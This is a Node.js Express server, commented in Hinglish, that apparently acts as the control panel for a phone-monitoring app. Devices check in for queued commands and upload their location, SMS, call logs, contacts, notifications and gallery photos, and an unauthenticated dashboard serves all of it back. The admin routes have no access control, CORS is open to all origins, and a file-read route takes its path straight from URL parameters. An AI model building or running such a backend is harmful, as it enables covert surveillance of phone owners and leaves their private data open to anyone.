const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETUP & STORAGE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' })); // Sab allow karo taaki error na aaye
app.use(bodyParser.json({ limit: '50mb' })); // Badi files ke liye limit
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Live Memory (RAM)
let devicesStatus = {}; 

// --- 2. ADMIN DASHBOARD ROUTES ---

// Dashboard ko saare devices ki list dene ke liye
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// Single Device ka status (Dashboard refresh hone par yahan se data leta hai)
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    if (!device) return res.json({ id: id, isOnline: false });
    
    // 60 second rule: Agar 1 min se ping nahi aaya toh Offline
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    
    res.json({ 
        ...device, 
        isOnline: isOnline 
    });
});

// --- 3. PHONE CONNECTION (PING) ---

app.post('/api/status', (req, res) => {
    try {
        // Phone se data receive karo
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();

        // Check karo koi Command pending hai kya?
        const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

        // BATTERY FIX: App kabhi 'battery' bhejta hai kabhi 'level'
        let finalBattery = battery || level || 0;
        
        // CHARGING FIX: String "true" ko asli True mein badlo
        let isCharging = (String(charging) === "true");

        // LOCATION FIX: Agar Ping mein location aayi hai, to update karo
        let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
        let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);

        // Update RAM
        devicesStatus[id] = {
            id: id,
            model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
            battery: finalBattery,
            version: version || "--",
            charging: isCharging,
            lat: currentLat,
            lon: currentLon,
            lastSeen: Date.now(),
            command: "none" // Command le liya, ab queue khali karo
        };

        console.log(`📡 [PING] ${id} | Bat: ${finalBattery}% | Cmd: ${pendingCommand}`);
        
        // Phone ko command wapas bhejo
        res.json({ status: "success", command: pendingCommand });

    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// --- 4. COMMAND SENDING (AUDIO FIX) ---

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id }; // Agar pehli baar hai toh create karo
    
    // --- UNSILENT FIX ---
    // Dashboard bhejta hai "normal", Phone samajhta hai "loud"
    // Isliye hum yahan convert kar rahe hain taaki phone pakka awaaz kare
    let finalCommand = command;
    if (command === "normal") {
        finalCommand = "loud"; 
    }

    devicesStatus[id].command = finalCommand;
    console.log(`🚀 [COMMAND] Sending '${finalCommand}' to ${id}`);
    
    res.json({ status: "success", command: finalCommand });
});

// --- 5. DATA UPLOAD (LOCATION FIX) ---

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // --- LOCATION RAM UPDATE (CRITICAL FIX) ---
        // Pehle location sirf file mein save ho rahi thi, RAM mein nahi.
        // Isliye Dashboard par purani location dikhti thi. Ab fix ho gaya.
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            
            if (locObj && (locObj.lat || locObj.latitude)) {
                // Update RAM immediately
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                
                console.log(`📍 [LOCATION UPDATE] ${id} -> ${devicesStatus[id].lat}, ${devicesStatus[id].lon}`);
            }
            
            // File mein bhi save karo
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
        }
        
        // --- NOTIFICATIONS / SMS HANDLING ---
        else if (['notifications', 'sms', 'call_logs', 'contacts'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 1000); // Sirf last 1000 rakho
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        } 
        
        // --- OTHER DATA ---
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// --- 6. GALLERY UPLOAD ---

app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);

    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) {
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        
        galleryData.unshift({ 
            time: date || new Date().toLocaleString(), 
            uploadedAt: Date.now(), 
            image: image_data 
        });

        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2)); // Last 50 photos
        console.log(`📸 [GALLERY] New photo from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ error: "Failed to save photo" });
    }
});

// --- 7. GET DATA FOR DASHBOARD VIEWS ---

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// Start Server
app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
